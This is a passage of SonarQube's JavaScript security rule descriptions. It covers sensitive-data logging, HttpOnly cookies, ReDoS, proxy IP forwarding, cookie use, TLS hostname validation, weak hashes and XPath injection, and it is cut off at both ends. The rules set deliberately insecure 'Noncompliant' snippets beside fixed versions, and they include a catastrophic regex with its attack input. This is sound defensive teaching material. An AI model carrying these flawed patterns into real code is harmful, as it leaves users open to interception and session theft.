<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5757">
              javascript:S5757
            </a>
          </td>
          <td>
            <details>
              <p>Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is
recorded and available for an analyst to understand what’s happened on the web application in case of malicious activities.</p>
<p>Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, <a
href="https://www.pcisecuritystandards.org/documents/Effective-Daily-Log-Monitoring-Guidance.pdf">PCI DSS</a> and others. However, to protect user’s
privacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously
should not be stored or at least not in clear text.</p>
<h2>Ask Yourself Whether</h2>
<p>In a production environment:</p>
<ul>
  <li> The web application uses confidential information and logs a significant amount of data. </li>
  <li> Logs are externalized to SIEM or Big Data repositories. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Loggers should be configured with a list of confidential, personal information that will be hidden/masked or removed from logs.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://www.npmjs.com/package/signale">Signale log management framework</a> the code is sensitive when an empty list of secrets is
defined:</p>
<pre>
const { Signale } = require('signale');

const CREDIT_CARD_NUMBERS = fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like ["1234-5678-0000-9999", "1234-5678-0000-8888"]; for instance

const options = {
  secrets: []         // empty list of secrets
};

const logger = new Signale(options); // Sensitive

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);
});
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://www.npmjs.com/package/signale">Signale log management framework</a> it is possible to define a list of secrets that will be
hidden in logs:</p>
<pre>
const { Signale } = require('signale');

const CREDIT_CARD_NUMBERS = fetchFromWebForm()
// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like ["1234-5678-0000-9999", "1234-5678-0000-8888"]; for instance

const options = {
  secrets: ["([0-9]{4}-?)+"]
};

const logger = new Signale(options); // Compliant

CREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {
  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);
});
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S3330">
              javascript:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  httpOnly: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express'),
const session = require('express-session'),

let app = express()
app.use(session({
  cookie:
  {
    httpOnly: false // Sensitive
  }
})),
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  httpOnly: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { httpOnly: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session">cookie-session</a> module:</p>
<pre>
let session = cookieSession({
  httpOnly: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session">express-session</a> module:</p>
<pre>
const express = require('express');
const session = require('express-session');

let app = express();
app.use(session({
  cookie:
  {
    httpOnly: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies">cookies</a> module:</p>
<pre>
let cookies = new Cookies(req, res, { keys: keys });

cookies.set('LastVisit', new Date().toISOString(), {
  httpOnly: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf">csurf</a> module:</p>
<pre>
const cookieParser = require('cookie-parser');
const csrf = require('csurf');
const express = require('express');

let csrfProtection = csrf({ cookie: { httpOnly: true }}); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1004">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4784">
              javascript:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS5852&rule_key=javascript%3AS5852'>S5852</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021">CVE-2017-16021</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863">CVE-2018-13863</a> </li>
</ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a
href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*+{</code>.</p>
<p>Example: <code>(a+)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
const regex = /(a+)+b/; // Sensitive
const regex2 = new RegExp("(a+)+b"); // Sensitive

str.search("(a+)+b"); // Sensitive
str.match("(a+)+b"); // Sensitive
str.split("(a+)+b"); // Sensitive
</pre>
<p>Note: String.matchAll does not raise any issue as it is not supported by NodeJS.</p>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,
<code>(a|a?)+</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a "<code>|</code>".</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">CWE-624 - Executable Regular Expression
  Error</a> </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5759">
              javascript:S5759
            </a>
          </td>
          <td>
            <details>
              <p>Users often connect to web servers through HTTP proxies.</p>
<p>Proxy can be configured to forward the client IP address via the <code>X-Forwarded-For</code> or <code>Forwarded</code> HTTP headers.</p>
<p>IP address is a personal information which can identify a single user and thus impact his privacy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses reverse proxies or similar but doesn’t need to know the IP address of the user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>User IP address should not be forwarded unless the application needs it, as part of an authentication, authorization scheme or log management for
examples.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://github.com/http-party/node-http-proxy">node-http-proxy</a></p>
<pre>
var httpProxy = require('http-proxy');

httpProxy.createProxyServer({target:'http://localhost:9000', xfwd:true}) // Noncompliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware">http-proxy-middleware</a></p>
<pre>
var express = require('express');

const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true, xfwd: true })); // Noncompliant
app.listen(3000);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://github.com/http-party/node-http-proxy">node-http-proxy</a></p>
<pre>
var httpProxy = require('http-proxy');

// By default xfwd option is false
httpProxy.createProxyServer({target:'http://localhost:9000'}) // Compliant
  .listen(8000);
</pre>
<p><a href="https://github.com/chimurai/http-proxy-middleware">http-proxy-middleware</a></p>
<pre>
var express = require('express');

const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

// By default xfwd option is false
app.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true})); // Compliant
app.listen(3000);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">developer.mozilla.org</a> - X-Forwarded-For </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2255">
              javascript:S2255
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639">CVE-2018-11639</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn’t make them secure. Follow <a
href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies">OWASP best practices</a> when you configure your
cookies.</p>
<p>As a side note, every information read from a cookie should be <a
href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
// === Built-in NodeJS modules ===
const http = require('http');
const https = require('https');

http.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive
});
https.createServer(function(req, res) {
  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive
});
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const app = express();
app.use(function(req, res, next) {
  res.cookie('name', 'John'); // Sensitive
});
</pre>
<pre>
// === In browser ===
// Set cookie
document.cookie = "name=John"; // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/312">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE">COOKIE_USAGE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5527">
              javascript:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>checkServerIdentity</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls = require('node:tls');

let options = {
  checkServerIdentity: function() {}, // Noncompliant
  secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls = require('node:tls');

let options = {
  secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4790">
              javascript:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
const crypto = require("crypto");

const hash = crypto.createHash('sha1'); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const crypto = require("crypto");

const hash = crypto.createHash('sha512'); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4817">
              javascript:S4817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272">CVE-2016-6272</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149">CVE-2016-9149</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837">CVE-2012-4837</a> </li>
</ul>
<p>User-provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Sensitive Code Example</h2>
<pre>
// === Server side ===

var xpath = require('xpath');
var xmldom = require('xmldom');

var doc = new xmldom.DOMParser().parseFromString(xml);
var nodes = xpath.select(userinput, doc); // Sensitive
var node = xpath.select1(userinput, doc); // Sensitive
</pre>
<pre>
// === Client side ===

// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:
var nodes = document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Sensitive

// Internet Explorer uses its own methods to select nodes:
var nodes = xmlDoc.selectNodes(userinput); // Sensitive
var node = xmlDoc.SelectSingleNode(userinput); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/643">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4818">
              javascript:S4818
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785">CVE-2011-178</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645">CVE-2017-5645</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
